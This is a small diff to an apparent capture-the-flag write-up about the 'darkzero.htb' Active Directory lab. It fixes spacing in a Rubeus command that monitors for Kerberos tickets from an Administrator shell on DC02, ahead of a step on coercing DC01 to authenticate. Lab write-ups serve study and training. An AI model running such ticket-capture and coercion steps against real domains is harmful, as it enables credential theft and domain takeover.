@@ -521,7 +521,7 @@ The `darkzero.htb` and `darkzero.ext` forests share a **bidirectional cross-fore
 From the Administrator shell on DC02, launching Rubeus in TGT monitoring mode:
 
 ```powershell
-./Rubeus.exe monitor /interval:5  /nowrap
+./Rubeus.exe monitor /interval:5 /nowrap
 ```
 
 ### Step 2 — Coerce DC01 Authentication 
